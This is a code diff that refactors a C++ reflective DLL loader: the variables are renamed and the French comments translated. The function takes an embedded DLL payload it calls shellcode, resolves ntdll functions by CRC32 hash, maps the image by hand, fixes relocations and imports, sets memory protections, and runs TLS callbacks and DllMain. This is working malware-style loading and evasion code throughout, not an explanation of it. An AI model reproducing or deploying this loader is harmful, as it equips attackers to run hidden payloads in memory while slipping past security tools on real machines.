@@ -33,212 +33,212 @@ extern "C" void entry() {
   void *p_ntdll = get_ntdll();
   void *p_rtl_init_unicode_string =
       get_proc_address_by_hash(p_ntdll, RtlInitUnicodeString_CRC32b);
-  RtlInitUnicodeString *g_rtl_init_unicode_string =
+  RtlInitUnicodeString *pfn_rtl_init_unicode_string =
       (RtlInitUnicodeString *)p_rtl_init_unicode_string;
 
-  // =========================================================================
-  // 1. Le shellcode DLL est déjà en mémoire (section .data)
-  // =========================================================================
+  ////////////////////////////////////////////////////////////////////////////
+  // 1. DLL shellcode already staged in memory
+  ////////////////////////////////////////////////////////////////////////////
   void *dll_bytes = (void *)dll_bin;
 
-  // =========================================================================
-  // 2. Parsing PE headers
-  // =========================================================================
-  PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)dll_bytes;
-  PIMAGE_NT_HEADERS nt_headers =
-      (PIMAGE_NT_HEADERS)((unsigned long long)dll_bytes + dos_header->e_lfanew);
-  SIZE_T dll_image_size = nt_headers->OptionalHeader.SizeOfImage;
+  ////////////////////////////////////////////////////////////////////////////
+  // 2. Parse PE headers
+  ////////////////////////////////////////////////////////////////////////////
+  PIMAGE_DOS_HEADER p_dos_header = (PIMAGE_DOS_HEADER)dll_bytes;
+  PIMAGE_NT_HEADERS p_nt_headers =
+      (PIMAGE_NT_HEADERS)((unsigned long long)dll_bytes + p_dos_header->e_lfanew);
+  SIZE_T dll_image_size = p_nt_headers->OptionalHeader.SizeOfImage;
 
-  // =========================================================================
-  // 3. Allocation mémoire pour l'image mappée
-  // =========================================================================
+  ////////////////////////////////////////////////////////////////////////////
+  // 3. Allocate memory for the mapped image
+  ////////////////////////////////////////////////////////////////////////////
   void *dll_base = NULL;
   void *p_nt_allocate_virtual_memory =
       get_proc_address_by_hash(p_ntdll, NtAllocateVirtualMemory_CRC32b);
-  NtAllocateVirtualMemory *g_nt_allocate_virtual_memory =
+  NtAllocateVirtualMemory *pfn_nt_allocate_virtual_memory =
       (NtAllocateVirtualMemory *)p_nt_allocate_virtual_memory;
 
-  NTSTATUS status = g_nt_allocate_virtual_memory(
+  NTSTATUS nt_status = pfn_nt_allocate_virtual_memory(
       ((HANDLE)-1), &dll_base, 0, &dll_image_size, MEM_COMMIT, PAGE_READWRITE);
-  if (status != 0)
+  if (nt_status != 0)
     EXIT(-3);
 
-  // =========================================================================
-  // 4. Calcul delta + copie headers
-  // =========================================================================
+  ////////////////////////////////////////////////////////////////////////////
+  // 4. Compute relocation delta and copy headers
+  ////////////////////////////////////////////////////////////////////////////
   unsigned long long delta_image_base =
-      (unsigned long long)dll_base - nt_headers->OptionalHeader.ImageBase;
-  mc(dll_base, dll_bytes, nt_headers->OptionalHeader.SizeOfHeaders);
+      (unsigned long long)dll_base - p_nt_headers->OptionalHeader.ImageBase;
+  mc(dll_base, dll_bytes, p_nt_headers->OptionalHeader.SizeOfHeaders);
 
-  // =========================================================================
-  // 5. Copie sections
-  // =========================================================================
-  PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt_headers);
-  for (WORD i = 0; i < nt_headers->FileHeader.NumberOfSections; i++) {
-    void *dest = (PBYTE)dll_base + section->VirtualAddress;
-    void *src = (PBYTE)dll_bytes + section->PointerToRawData;
-    if (section->SizeOfRawData > 0) {
-      mc(dest, src, section->SizeOfRawData);
+  ////////////////////////////////////////////////////////////////////////////
+  // 5. Map sections
+  ////////////////////////////////////////////////////////////////////////////
+  PIMAGE_SECTION_HEADER p_section = IMAGE_FIRST_SECTION(p_nt_headers);
+  for (WORD i = 0; i < p_nt_headers->FileHeader.NumberOfSections; i++) {
+    void *dest = (PBYTE)dll_base + p_section->VirtualAddress;
+    void *src = (PBYTE)dll_bytes + p_section->PointerToRawData;
+    if (p_section->SizeOfRawData > 0) {
+      mc(dest, src, p_section->SizeOfRawData);
     }
-    section++;
+    p_section++;
   }
 
-  // =========================================================================
-  // 6. Relocations (lecture directe, pas besoin de NtReadVirtualMemory)
-  // =========================================================================
-  IMAGE_DATA_DIRECTORY relocations =
-      nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
-  if (relocations.VirtualAddress != 0 && relocations.Size > 0) {
+  ////////////////////////////////////////////////////////////////////////////
+  // 6. Apply reloc_dir
+  ////////////////////////////////////////////////////////////////////////////
+  IMAGE_DATA_DIRECTORY reloc_dir =
+      p_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+  if (reloc_dir.VirtualAddress != 0 && reloc_dir.Size > 0) {
     unsigned long long relocation_table =
-        relocations.VirtualAddress + (unsigned long long)dll_base;
-    unsigned long relocations_processed = 0;
+        reloc_dir.VirtualAddress + (unsigned long long)dll_base;
+    unsigned long cb_relocations_processed = 0;
 
-    while (relocations_processed < relocations.Size) {
-      PBASE_RELOCATION_BLOCK relocation_block =
-          (PBASE_RELOCATION_BLOCK)(relocation_table + relocations_processed);
-      relocations_processed += sizeof(BASE_RELOCATION_BLOCK);
+    while (cb_relocations_processed < reloc_dir.Size) {
+      PBASE_RELOCATION_BLOCK p_relocation_block =
+          (PBASE_RELOCATION_BLOCK)(relocation_table + cb_relocations_processed);
+      cb_relocations_processed += sizeof(BASE_RELOCATION_BLOCK);
 
-      if (relocation_block->BlockSize == 0)
+      if (p_relocation_block->BlockSize == 0)
         break;
 
-      unsigned long relocations_count =
-          (relocation_block->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) /
+      unsigned long cb_relocations_count =
+          (p_relocation_block->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) /
           sizeof(BASE_RELOCATION_ENTRY);
-      PBASE_RELOCATION_ENTRY relocation_entries =
-          (PBASE_RELOCATION_ENTRY)(relocation_table + relocations_processed);
+      PBASE_RELOCATION_ENTRY p_relocation_entries =
+          (PBASE_RELOCATION_ENTRY)(relocation_table + cb_relocations_processed);
 
-      for (unsigned long i = 0; i < relocations_count; i++) {
-        relocations_processed += sizeof(BASE_RELOCATION_ENTRY);
-        if (relocation_entries[i].Type == 0)
+      for (unsigned long i = 0; i < cb_relocations_count; i++) {
+        cb_relocations_processed += sizeof(BASE_RELOCATION_ENTRY);
+        if (p_relocation_entries[i].Type == 0)
           continue;
 
-        unsigned long long relocation_rva =
-            relocation_block->PageAddress + relocation_entries[i].Offset;
-        unsigned long long *pPatch =
-            (unsigned long long *)((PBYTE)dll_base + relocation_rva);
-        *pPatch += delta_image_base;
+        unsigned long long rva_relocation =
+            p_relocation_block->PageAddress + p_relocation_entries[i].Offset;
+        unsigned long long *p_patch =
+            (unsigned long long *)((PBYTE)dll_base + rva_relocation);
+        *p_patch += delta_image_base;
       }
     }
   }
 
-  // =========================================================================
-  // 7. Imports via LdrLoadDll + LdrGetProcedureAddress
-  // =========================================================================
-  IMAGE_DATA_DIRECTORY images_directory =
-      nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
-  if (images_directory.VirtualAddress != 0) {
-    PIMAGE_IMPORT_DESCRIPTOR import_descriptor =
-        (PIMAGE_IMPORT_DESCRIPTOR)(images_directory.VirtualAddress +
+  ////////////////////////////////////////////////////////////////////////////
+  // 7. Resolve imports via LdrLoadDll + LdrGetProcedureAddress
+  ////////////////////////////////////////////////////////////////////////////
+  IMAGE_DATA_DIRECTORY import_directory =
+      p_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
+  if (import_directory.VirtualAddress != 0) {
+    PIMAGE_IMPORT_DESCRIPTOR p_import_descriptor =
+        (PIMAGE_IMPORT_DESCRIPTOR)(import_directory.VirtualAddress +
                                    (unsigned long long)dll_base);
-    void *current_library = NULL;
+    void *h_library = NULL;
 
-    while (import_descriptor->Name != 0) {
+    while (p_import_descriptor->Name != 0) {
       void *p_ldr_load_dll =
           get_proc_address_by_hash(p_ntdll, LdrLoadDll_CRC32b);
-      char *module_name = (char *)dll_base + import_descriptor->Name;
+      char *p_module_name = (char *)dll_base + p_import_descriptor->Name;
       wchar_t w_module_name[MAX_PATH];
-      unsigned long num_converted;
+      unsigned long cb_converted;
 
       void *p_rtl_multi_byte_to_unicode_n =
           get_proc_address_by_hash(p_ntdll, RtlMultiByteToUnicodeN_CRC32b);
-      RtlMultiByteToUnicodeN *g_rtl_multi_byte_to_unicode_n =
+      RtlMultiByteToUnicodeN *pfn_rtl_multi_byte_to_unicode_n =
           (RtlMultiByteToUnicodeN *)p_rtl_multi_byte_to_unicode_n;
 
-      if ((status = g_rtl_multi_byte_to_unicode_n(
-               w_module_name, sizeof(w_module_name), &num_converted,
-               module_name, strlen(module_name) + 1)) != 0x0)
+      if ((nt_status = pfn_rtl_multi_byte_to_unicode_n(
+               w_module_name, sizeof(w_module_name), &cb_converted,
+               p_module_name, strlen(p_module_name) + 1)) != 0x0)
         EXIT(-5);
 
       UNICODE_STRING import_library_name;
-      g_rtl_init_unicode_string(&import_library_name, w_module_name);
-      LdrLoadDll *g_ldr_load_dll = (LdrLoadDll *)p_ldr_load_dll;
-      if ((status = g_ldr_load_dll(NULL, NULL, &import_library_name,
-                                   &current_library)) != 0x0)
+      pfn_rtl_init_unicode_string(&import_library_name, w_module_name);
+      LdrLoadDll *pfn_ldr_load_dll = (LdrLoadDll *)p_ldr_load_dll;
+      if ((nt_status = pfn_ldr_load_dll(NULL, NULL, &import_library_name,
+                                   &h_library)) != 0x0)
         EXIT(-6);
 
-      if (current_library) {
-        ANSI_STRING a_string;
-        PIMAGE_THUNK_DATA thunk =
+      if (h_library) {
+        ANSI_STRING ansi_string;
+        PIMAGE_THUNK_DATA p_thunk =
             (PIMAGE_THUNK_DATA)((unsigned long long)dll_base +
-                                import_descriptor->FirstThunk);
-        PIMAGE_THUNK_DATA original_thunk =
+                                p_import_descriptor->FirstThunk);
+        PIMAGE_THUNK_DATA p_original_thunk =
             (PIMAGE_THUNK_DATA)((unsigned long long)dll_base +
-                                import_descriptor->OriginalFirstThunk);
+                                p_import_descriptor->OriginalFirstThunk);
 
-        while (thunk->u1.AddressOfData != 0) {
+        while (p_thunk->u1.AddressOfData != 0) {
           void *p_ldr_get_procedure_address =
               get_proc_address_by_hash(p_ntdll, LdrGetProcedureAddress_CRC32b);
-          LdrGetProcedureAddress *g_ldr_get_procedure_address =
+          LdrGetProcedureAddress *pfn_ldr_get_procedure_address =
               (LdrGetProcedureAddress *)p_ldr_get_procedure_address;
 
-          if (IMAGE_SNAP_BY_ORDINAL(thunk->u1.Ordinal)) {
-            g_ldr_get_procedure_address(current_library, NULL,
-                                        (WORD)original_thunk->u1.Ordinal,
-                                        (PVOID *)&(thunk->u1.Function));
+          if (IMAGE_SNAP_BY_ORDINAL(p_thunk->u1.Ordinal)) {
+            pfn_ldr_get_procedure_address(h_library, NULL,
+                                        (WORD)p_original_thunk->u1.Ordinal,
+                                        (PVOID *)&(p_thunk->u1.Function));
           } else {
-            PIMAGE_IMPORT_BY_NAME functionName =
+            PIMAGE_IMPORT_BY_NAME p_function_name =
                 (PIMAGE_IMPORT_BY_NAME)((unsigned long long)dll_base +
-                                        thunk->u1.AddressOfData);
-            FILL_STRING(a_string, functionName->Name);
-            g_ldr_get_procedure_address(current_library, &a_string, 0,
-                                        (PVOID *)&(thunk->u1.Function));
+                                        p_thunk->u1.AddressOfData);
+            FILL_STRING(ansi_string, p_function_name->Name);
+            pfn_ldr_get_procedure_address(h_library, &ansi_string, 0,
+                                        (PVOID *)&(p_thunk->u1.Function));
           }
-          ++thunk;
-          if (original_thunk)
-            ++original_thunk;
+          ++p_thunk;
+          if (p_original_thunk)
+            ++p_original_thunk;
         }
       }
-      import_descriptor++;
+      p_import_descriptor++;
     }
   }
 
-  // =========================================================================
-  // 8. Permissions des sections
-  // =========================================================================
-  PIMAGE_SECTION_HEADER section_header = IMAGE_FIRST_SECTION(nt_headers);
-  for (int i = 0; i < nt_headers->FileHeader.NumberOfSections;
-       i++, section_header++) {
-    if (section_header->SizeOfRawData || section_header->Misc.VirtualSize) {
-      unsigned long executable =
-          (section_header->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
-      unsigned long readable =
-          (section_header->Characteristics & IMAGE_SCN_MEM_READ) != 0;
-      unsigned long writeable =
-          (section_header->Characteristics & IMAGE_SCN_MEM_WRITE) != 0;
-      unsigned long protect = 0;
+  ////////////////////////////////////////////////////////////////////////////
+  // 8. Set p_section protections
+  ////////////////////////////////////////////////////////////////////////////
+  PIMAGE_SECTION_HEADER p_section_header = IMAGE_FIRST_SECTION(p_nt_headers);
+  for (int i = 0; i < p_nt_headers->FileHeader.NumberOfSections;
+       i++, p_section_header++) {
+    if (p_section_header->SizeOfRawData || p_section_header->Misc.VirtualSize) {
+      unsigned long is_executable =
+          (p_section_header->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
+      unsigned long is_readable =
+          (p_section_header->Characteristics & IMAGE_SCN_MEM_READ) != 0;
+      unsigned long is_writeable =
+          (p_section_header->Characteristics & IMAGE_SCN_MEM_WRITE) != 0;
+      unsigned long page_protect = 0;
 
-      if (!executable && !readable && !writeable)
-        protect = PAGE_NOACCESS;
-      else if (!executable && !readable && writeable)
-        protect = PAGE_WRITECOPY;
-      else if (!executable && readable && !writeable)
-        protect = PAGE_READONLY;
-      else if (!executable && readable && writeable)
-        protect = PAGE_READWRITE;
-      else if (executable && !readable && !writeable)
-        protect = PAGE_EXECUTE;
-      else if (executable && !readable && writeable)
-        protect = PAGE_EXECUTE_WRITECOPY;
-      else if (executable && readable && !writeable)
-        protect = PAGE_EXECUTE_READ;
-      else if (executable && readable && writeable)
-        protect = PAGE_EXECUTE_READWRITE;
+      if (!is_executable && !is_readable && !is_writeable)
+        page_protect = PAGE_NOACCESS;
+      else if (!is_executable && !is_readable && is_writeable)
+        page_protect = PAGE_WRITECOPY;
+      else if (!is_executable && is_readable && !is_writeable)
+        page_protect = PAGE_READONLY;
+      else if (!is_executable && is_readable && is_writeable)
+        page_protect = PAGE_READWRITE;
+      else if (is_executable && !is_readable && !is_writeable)
+        page_protect = PAGE_EXECUTE;
+      else if (is_executable && !is_readable && is_writeable)
+        page_protect = PAGE_EXECUTE_WRITECOPY;
+      else if (is_executable && is_readable && !is_writeable)
+        page_protect = PAGE_EXECUTE_READ;
+      else if (is_executable && is_readable && is_writeable)
+        page_protect = PAGE_EXECUTE_READWRITE;
 
-      if (section_header->Characteristics & IMAGE_SCN_MEM_NOT_CACHED)
-        protect |= PAGE_NOCACHE;
+      if (p_section_header->Characteristics & IMAGE_SCN_MEM_NOT_CACHED)
+        page_protect |= PAGE_NOCACHE;
 
       void *p_nt_protect_virtual_memory =
           get_proc_address_by_hash(p_ntdll, NtProtectVirtualMemory_CRC32b);
-      NtProtectVirtualMemory *g_nt_protect_virtual_memory =
+      NtProtectVirtualMemory *pfn_nt_protect_virtual_memory =
           (NtProtectVirtualMemory *)p_nt_protect_virtual_memory;
 
-      size_t size = section_header->Misc.VirtualSize;
-      void *address = (PBYTE)dll_base + section_header->VirtualAddress;
+      size_t cb_size = p_section_header->Misc.VirtualSize;
+      void *p_address = (PBYTE)dll_base + p_section_header->VirtualAddress;
       unsigned long old_protect = 0;
 
-      if ((status =
-               g_nt_protect_virtual_memory(NtCurrentProcess(), &address, &size,
-                                           protect, &old_protect)) != 0x0)
+      if ((nt_status =
+               pfn_nt_protect_virtual_memory(NtCurrentProcess(), &p_address, &cb_size,
+                                           page_protect, &old_protect)) != 0x0)
         EXIT(-7);
     }
   }
@@ -248,35 +248,35 @@ extern "C" void entry() {
   ////////////////////////////////////////////////////////////////////////////
   void *p_nt_flush_instruction_cache =
       get_proc_address_by_hash(p_ntdll, NtFlushInstructionCache_CRC32b);
-  NtFlushInstructionCache *g_nt_flush_instruction_cache =
+  NtFlushInstructionCache *pfn_nt_flush_instruction_cache =
       (NtFlushInstructionCache *)p_nt_flush_instruction_cache;
-  g_nt_flush_instruction_cache((HANDLE)-1, NULL, 0);
+  pfn_nt_flush_instruction_cache((HANDLE)-1, NULL, 0);
 
-  // =========================================================================
-  // 10. TLS callbacks
-  // =========================================================================
-  IMAGE_DATA_DIRECTORY tls_entry =
-      nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
-  if (tls_entry.Size) {
-    PIMAGE_TLS_DIRECTORY tls_dir =
+  ////////////////////////////////////////////////////////////////////////////
+  // 10. Run TLS callbacks
+  ////////////////////////////////////////////////////////////////////////////
+  IMAGE_DATA_DIRECTORY tls_directory_entry =
+      p_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
+  if (tls_directory_entry.Size) {
+    PIMAGE_TLS_DIRECTORY p_tls_directory =
         (PIMAGE_TLS_DIRECTORY)((unsigned long long)dll_base +
-                               tls_entry.VirtualAddress);
-    PIMAGE_TLS_CALLBACK *callback =
-        (PIMAGE_TLS_CALLBACK *)(tls_dir->AddressOfCallBacks);
-    for (; *callback; callback++)
-      (*callback)((LPVOID)dll_base, DLL_PROCESS_ATTACH, NULL);
+                               tls_directory_entry.VirtualAddress);
+    PIMAGE_TLS_CALLBACK *p_tls_callback =
+        (PIMAGE_TLS_CALLBACK *)(p_tls_directory->AddressOfCallBacks);
+    for (; *p_tls_callback; p_tls_callback++)
+      (*p_tls_callback)((LPVOID)dll_base, DLL_PROCESS_ATTACH, NULL);
   }
 
-  // =========================================================================
-  // 11. Appel DllMain
-  // =========================================================================
-  DLLEntry DllEntry =
+  ////////////////////////////////////////////////////////////////////////////
+  // 11. Call DllMain
+  ////////////////////////////////////////////////////////////////////////////
+  DLLEntry p_dll_entry =
       (DLLEntry)((unsigned long long)dll_base +
-                 nt_headers->OptionalHeader.AddressOfEntryPoint);
-  (*DllEntry)((HINSTANCE)dll_base, DLL_PROCESS_ATTACH, 0);
+                 p_nt_headers->OptionalHeader.AddressOfEntryPoint);
+  (*p_dll_entry)((HINSTANCE)dll_base, DLL_PROCESS_ATTACH, 0);
 
-  // =========================================================================
-  // 12. Cleanup (optionnel, DllMain ne retourne souvent pas)
-  // =========================================================================
+  ////////////////////////////////////////////////////////////////////////////
+  // 12. Cleanup
+  ////////////////////////////////////////////////////////////////////////////
   EXIT(0);
 }
